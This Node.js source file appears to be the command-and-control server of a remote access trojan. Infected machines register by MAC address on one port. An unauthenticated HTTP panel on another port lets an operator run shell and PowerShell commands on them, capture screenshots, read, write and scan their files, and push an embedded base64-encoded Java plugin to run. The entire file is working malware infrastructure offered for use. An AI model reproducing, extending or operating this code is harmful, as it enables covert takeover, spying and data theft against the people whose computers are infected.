const net = require('net');
const http = require('http');
const url = require('url');
const fs = require("fs");
const mime = require("mime-types");

class Plugin {
    name; base64;

    constructor(name, base64) {
        this.name = name;
        this.base64 = base64;
    }
}

const plugins = [
    new Plugin("KarPlugin", "w4rDvsK6wr4gICA0ICkKIAkgGwcgHAggHQogCCAeCCAfCiAJIB4LICAgIQcgIgcgIwEgBjxpbml0PgEgAygpVgEgBENvZGUBIA9MaW5lTnVtYmVyVGFibGUBIBJMb2NhbFZhcmlhYmxlVGFibGUBIAR0aGlzASALTEthclBsdWdpbjsBIANydW4BIBIoTGphdmEvdXRpbC9NYXA7KVYBIApwYXJhbWV0ZXJzASAPTGphdmEvdXRpbC9NYXA7ASAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEgNUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47ASAJU2lnbmF0dXJlASA4KExqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47KVYBIApTb3VyY2VGaWxlASAOS2FyUGx1Z2luLmphdmEMIAogCwEgEGphdmEvbGFuZy9PYmplY3QBIANrYXIMICQgJQEgAQoHICYMICcgKAEgCUthclBsdWdpbgEgBlBsdWdpbgEgBXdyaXRlASAdKFtMamF2YS9sYW5nL09iamVjdDspTFBsdWdpbjsBIApqYXZhL3V0aWwvTWFwASADZ2V0ASAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsgISAIIAkgICAgIAIgASAKIAsgASAMICAgLyABIAEgICAFKsK3IAHCsSAgIAIgCiAgIAYgASAgIAMgDiAgIAwgASAgIAUgDyAQICAgASARIBIgAiAMICAgdyAGIAIgICAtKgTCvSACWQMSA1PCtiAEBMK9IAJZAxIFU8K2IAYEwr0gAlkDKxIDwrkgBwIgU8K2IAZXwrEgICADIAogICAKIAIgICAGICwgByAOICAgFiACICAgLSAPIBAgICAgIC0gEyAUIAEgFSAgIAwgASAgIC0gEyAWIAEgFyAgIAIgGCABIBkgICACIBo=")
];


class Client {
    constructor(socket, os, doRequest) {
        this.ip = socket.remoteAddress;
        this.port = socket.remotePort;
        this.os = os;
        this.doRequest = doRequest;
        this.onCompletedArray = [];
        this.currentID = 0;
    }

    onRequestCompleted(result) {
        for (let i = 0; i < this.onCompletedArray.length; i++) {
            if (this.onCompletedArray[i](result)) {
                this.onCompletedArray.splice(i, 1);
            }
        }
    }

    request(type, data, onComplete, onError) {
        let id = this.currentID++;
        this.onCompletedArray.push(function(result) {
            if (result['id'] == id) {
                if (result['success']) {
                    onComplete(result);
                } else {
                    if (typeof onError === "function") {
                        onError(new Error(result['error']))
                    } else {
                        throw new Error(result['error'])
                    }
                }
                return true;
            }
            return false;
        });
        data['type'] = type;
        data['id'] = id;
        this.doRequest(data);
    }

    setCommand(command, onComplete, isPSL = false, onError) {
        isPSL = !!isPSL;
        this.request(isPSL ? "psl" : "command", {
            command: command
        }, onComplete, onError);
    }

    takeScreenshot(onComplete, onError) {
        this.request("screenshot", {}, onComplete, onError);
    }

    getFile(path, onComplete, onError) {
        this.request("get_file", {
            "path": path
        }, onComplete, onError);
    }

    writeFile(path, base64, onComplete, onError) {
        this.request("write_file", {
            path: path,
            base64: base64
        }, onComplete, onError);
    }

    scan(dir, onComplete, onError) {
        this.request("scan", {
            dir: dir
        }, onComplete, onError);
    }

    executePlugin(pluginID, parameters, onComplete, onError) {
        this.request("plugin", {
            base64: plugins[pluginID].base64,
            name: plugins[pluginID].name,
            parameters: parameters
        }, onComplete, onError)
    }
}

JSON.safeParse = function (str) {
    try {
        return this.parse(str);
    } catch (e) {
        return false;
    }
};

const clients = {};

const socketServer = net.createServer(socket => {
    let mac, client, os, fullData = "";
    socket.on('data', chunk => {
        if (chunk.toString().charAt(chunk.toString().length - 1) === "}") {
            fullData += chunk.toString();
            let obj = JSON.safeParse(fullData);
            fullData = "";
            if (obj) {
                if (obj['type'] === 'init') {
                    mac = obj['mac'];
                    os = obj['os'];
                    client = clients[mac] = new Client(socket, os, (data) => {
                        socket.write(JSON.stringify(data) + "\n");
                    });
                    console.log("Client " + mac + " connected!\nOS: " + os + "\nIP address: " + client.ip + ":" + client.port + "\n");
                } else if (obj['type'] === "result") {
                    client.onRequestCompleted(obj);
                }
            }
        } else fullData += chunk.toString();
    });

    socket.on('end', onEnd);
    socket.on('error', onEnd);

    function onEnd(e) {
        if (e) console.log(e);
        if (clients[mac] !== undefined) {
            clients[mac] = undefined;
            console.log("Client " + mac + " disconnected!");
        }
    }
});

socketServer.listen(8080);

const httpServer = http.createServer((req, res) => {
    let query = url.parse(req.url, true).query;
    function handleError(err) {
        res.writeHead(403, {'Content-Type': 'text/html'});
        res.end("Error: " + err.toString());
    }
    if (query != null) {
        if (typeof query['mac'] !== "undefined") {
            if (clients[query['mac']] !== undefined) {
                if (typeof query['command'] !== "undefined") {
                    clients[query['mac']].setCommand(query['command'], result => {
                        res.writeHead(200, {'Content-Type': 'text/plain'});
                        res.end(result['result']);
                    }, false, handleError);
                } else if (typeof query['psl'] !== "undefined") {
                    clients[query['mac']].setCommand(query['psl'], result => {
                        res.writeHead(200, {'Content-Type': 'text/plain'});
                        res.end(result['result']);
                    }, true, handleError);
                } else if (typeof query['screenshot'] !== "undefined") {
                    clients[query['mac']].takeScreenshot(result => {
                        res.writeHead(200, {'Content-Type': 'image/png'});
                        res.end(Buffer.from(result['base64'], 'base64'));
                    }, handleError);
                } else if (typeof query['path'] !== "undefined") {
                    if (typeof query['base64'] === "undefined") {
                        clients[query['mac']].getFile(query["path"], result => {
                            let decoded = Buffer.from(result['base64'], 'base64');
                            res.writeHead(200, {
                                'Content-Type': mime.lookup(query['path']) || 'application/octet-stream',
                                'Content-Disposition': `attachment; filename=${(() => {
                                    let arr = query['path'].split(/[\\/]/);
                                    return arr[arr.length - 1];
                                })()}`
                            });
                            //res.writeHead(200, {'Content-Type': 'text/plain'});
                            /*fs.writeFile((() => {
                                let arr = query['path'].split(/[\\/]/);
                                return arr[arr.length - 1];
                            })(), decoded, () => {});*/
                            res.end(decoded);
                            //res.end(result['base64']);
                        }, handleError);
                    } else {
                        clients[query['mac']].writeFile(query['path'], query['base64'], result => {
                            res.end("");
                        }, handleError);
                    }
                } else if (typeof query['scan'] !== "undefined") {
                    clients[query['mac']].scan(query['scan'], result => {
                        res.writeHead(200, {'Content-Type': 'application/json'});
                        res.end(JSON.stringify(result));
                    }, handleError);
                } else if (typeof query['pluginID'] !== "undefined" && typeof query['parameters'] !== "undefined") {
                    if (typeof plugins[query['pluginID']] !== "undefined" && JSON.safeParse(query["parameters"])) {
                        clients[query["mac"]].executePlugin(query['pluginID'], JSON.safeParse(query["parameters"]), result => {
                            res.end(result);
                        }, handleError);
                    }
                } else {
                    res.writeHead(403, {'Content-Type': 'text/html'});
                    res.end("Unknown operation");
                }
            } else {
                res.writeHead(403, {'Content-Type': 'text/html'});
                res.end('Such mac is not connected');
            }
        } else if (typeof query['clients'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            let obj = [];
            for (let mac in clients) {
                if (clients.hasOwnProperty(mac) && typeof clients[mac] !== "undefined") {
                    obj.push({
                        mac: mac,
                        ip: clients[mac].ip,
                        port: clients[mac].port,
                        os: clients[mac].os,
                    });
                }
            }
            res.end(JSON.stringify(obj));
        } else if (typeof query['control'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/html'});
            fs.readFile("index.html", "utf8", (err, data) => {
                if (err) {
                    res.end(err.toString());
                } else {
                    res.end(data.toString());
                }
            });
        } else {
            res.end("fuck you");
        }
    } else {
        res.end("wtf");
    }
});

httpServer.listen(6702);